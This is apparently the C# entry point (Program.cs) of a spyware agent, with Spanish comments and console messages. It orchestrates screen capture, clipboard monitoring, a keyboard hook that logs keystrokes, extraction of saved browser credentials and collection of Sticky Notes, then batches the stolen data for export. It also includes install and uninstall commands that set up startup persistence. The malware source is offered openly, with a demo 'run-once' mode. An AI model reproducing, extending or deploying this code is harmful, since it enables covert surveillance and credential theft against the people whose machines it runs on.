using System.Windows.Forms;
using Spyware.Collectors.Browsers;
using Spyware.Collectors.Clipboard;
using Spyware.Collectors.Keyboard;
using Spyware.Collectors.Notes;
using Spyware.Collectors.Screenshot;
using Spyware.Core.Configuration;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Runtime;
using Spyware.Maintenance;
using Spyware.Storage;
using Spyware.Transport;

namespace Spyware.Agent;

internal static class Program
{
    [STAThread]
    private static int Main(string[] args)
    {
        bool attached = ConsoleAdapter.AttachToParentConsole();

        if (!ProgramOptions.TryParse(args, out ProgramOptions options, out string? error))
        {
            Console.Error.WriteLine("ERROR: " + error);
            ProgramOptions.PrintUsage(Console.Out);
            ConsoleAdapter.Detach();
            return 2;
        }

        if (options.ShowHelp)
        {
            ProgramOptions.PrintUsage(Console.Out);
            ConsoleAdapter.Detach();
            return 0;
        }

        AgentPaths paths = AgentPaths.Create(options.DataDirectory);
        paths.EnsureDirectories();

        using var logger = new FileLogger(paths.LogDirectory, "agent.log");

        AgentConfig config = ConfigLoader.LoadOrCreate(paths, logger);
        logger.MinimumLevel = ConfigLoader.ParseLevel(config.Logging.Level);
        logger.MirrorToConsole = options.Verbose || config.Logging.MirrorToConsole;

        // Overrides de demostración: se aplican a esta ejecución sin reescribir config.json.
        if (!string.IsNullOrWhiteSpace(options.NotesDatabase))
            config.Notes.DatabaseOverride = options.NotesDatabase;

        if (!string.IsNullOrWhiteSpace(options.NotesSnt))
            config.Notes.LegacyOverride = options.NotesSnt;

        try
        {
            return options.Command switch
            {
                AgentCommand.Install => Installer.Install(paths, config, logger, new InstallOptions(
                    options.ExecutablePath, options.ValueName, options.CopyBinaries,
                    options.StartupFolder, options.StartProcess)),

                AgentCommand.Uninstall => Uninstaller.Run(paths, config, logger,
                    new UninstallOptions(options.RemoveData, options.RemoveStartupFolder, StopProcess: true)),

                AgentCommand.Status => StatusReport.Print(paths, config, logger),

                AgentCommand.RunOnce => RunOnce(paths, config, logger, options),

                _ => RunAgent(paths, config, logger)
            };
        }
        catch (Exception ex)
        {
            logger.Error($"Fallo no controlado en {options.Command}.", ex);
            Console.Error.WriteLine("ERROR: " + ex.Message);
            return 1;
        }
        finally
        {
            if (attached) ConsoleAdapter.Detach();
        }
    }

    private static int RunAgent(AgentPaths paths, AgentConfig config, ILog log)
    {
        using var guard = new SingleInstanceGuard();

        if (!guard.TryAcquire(config.MutexSeed, log))
        {
            log.Warn("Ya existe otra instancia del agente; esta termina de inmediato.");
            return 0;
        }

        Application.SetHighDpiMode(HighDpiMode.PerMonitorV2);
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);

        using var runtime = new AgentRuntime(paths, config, log);
        runtime.Start();

        using var context = new AgentApplicationContext(runtime);

        AppDomain.CurrentDomain.ProcessExit += (_, _) => runtime.Stop("ProcessExit");

        Application.Run(context);
        return 0;
    }

    /// <summary>Ciclo completo de validación sin quedarse residente.</summary>
    private static int RunOnce(AgentPaths paths, AgentConfig config, ILog log, ProgramOptions options)
    {
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var spool = new SpoolManager(paths, log);

        Console.WriteLine("== run-once ==");
        Console.WriteLine("Directorio de datos: " + paths.RootDirectory);

        var screens = new ScreenCaptureService(paths, repository, spool, config.Screenshot, log);
        var screenshot = screens.CaptureOnce();

        Console.WriteLine(screenshot is null
            ? "Captura: omitida o fallida (ver log)."
            : $"Captura: {screenshot.Width}x{screenshot.Height} -> {screenshot.Path}");

        screens.Stop();

        var clipboard = new ClipboardMonitor(paths, repository, spool, config.Clipboard, log);
        clipboard.Start();

        Console.WriteLine($"Escuchando el portapapeles {options.ClipboardSeconds} s … copia algo ahora.");
        Thread.Sleep(TimeSpan.FromSeconds(options.ClipboardSeconds));

        clipboard.Stop();
        Console.WriteLine($"Portapapeles: {clipboard.CapturedCount} eventos nuevos, {clipboard.DuplicateCount} duplicados omitidos.");

        var browsers = new BrowserCredentialProvider(paths, repository, spool, config.Browsers, log);
        int freshCredentials = browsers.CollectAll();
        Console.WriteLine($"Navegadores: {freshCredentials} credenciales nuevas o cambiadas " +
                          $"({browsers.TotalExtracted} registradas en total, " +
                          $"{browsers.SkippedUnchangedCount} sin cambios omitidas).");

        var keyboard = new KeyCaptureService(paths, repository, spool, config.Keyboard, log,
            focusCapture: () => screens.CaptureOnce());
        keyboard.Start();

        Console.WriteLine($"Escuchando el teclado {options.KeySeconds} s … escribe algo ahora " +
                          "(la ráfaga se cierra al cambiar de ventana o tras la pausa configurada).");
        Thread.Sleep(TimeSpan.FromSeconds(options.KeySeconds));

        keyboard.Stop();
        Console.WriteLine($"Teclado: {keyboard.KeyCount} pulsaciones, {keyboard.CapturedCount} ráfagas guardadas, " +
                          $"{keyboard.DuplicateCount} duplicados omitidos.");
        Console.WriteLine("Teclado (hook): " + keyboard.HookState);

        var notes = new StickyNotesProvider(paths, repository, spool, config.Notes, log);
        int freshNotes = notes.CollectAll();

        Console.WriteLine($"Sticky Notes: {freshNotes} notas nuevas o cambiadas " +
                          $"({notes.TotalCollected} registradas en total).");

        IReadOnlyList<IEventExporter> exporters = TransportFactory.Create(paths, config, log);
        using var batcher = new EventBatcher(config.AgentId, repository, exporters, config.Transport, log);

        int exported = batcher.Flush();

        foreach ((string key, int value) in repository.GetStats())
            Console.WriteLine($"  {key,-26}: {value}");

        Console.WriteLine("Exportados en este ciclo: " + exported);

        HealthCheck.Write(paths, new HealthSnapshot
        {
            AgentId = config.AgentId,
            ProcessId = ProcessContext.ProcessId,
            AgentVersion = "run-once",
            MachineName = ProcessContext.MachineName,
            UserName = ProcessContext.UserName,
            SessionId = ProcessContext.SessionId,
            Token = ProcessContext.DescribeToken(),
            Persistence = "n/a (run-once)",
            // Se refleja lo que dice config.json, igual que AgentRuntime.BuildSnapshot:
            // run-once fuerza cada paso para validarlo, pero el latido debe decir la verdad.
            Collectors = new Dictionary<string, bool>
            {
                ["screenshot"] = config.Screenshot.Enabled,
                ["clipboard"] = config.Clipboard.Enabled,
                ["browsers"] = config.Browsers.Enabled,
                ["keyboard"] = config.Keyboard.Enabled,
                ["notes"] = config.Notes.Enabled,
                ["transport"] = config.Transport.Enabled
            },
            Storage = repository.GetStats(),
            StorageBytes = spool.GetManagedStorageBytes(),
            PendingEvents = repository.CountUnsent()
        }, log);

        Console.WriteLine("Pendientes tras el ciclo: " + repository.CountUnsent());
        return 0;
    }
}
